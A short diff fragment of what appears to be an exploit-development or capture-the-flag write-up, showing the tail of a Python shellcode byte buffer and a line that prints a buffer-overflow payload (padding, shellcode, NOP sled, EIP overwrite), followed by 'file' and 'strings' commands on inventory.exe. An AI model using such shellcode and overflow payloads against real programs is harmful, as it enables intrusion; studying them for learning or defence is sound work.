@@ -1599,7 +1599,7 @@ buf += b"\x24\x97\x0f\x55\x35\x57\xb0\xa5\x53\x33\xb0\xf2"
 buf += b"\xf0\x32\x51\x31\x76"
 print(buffer+buf+nop+eip)
 ```
-```
+
 file inventory.exe
 strings inventory.exe
 
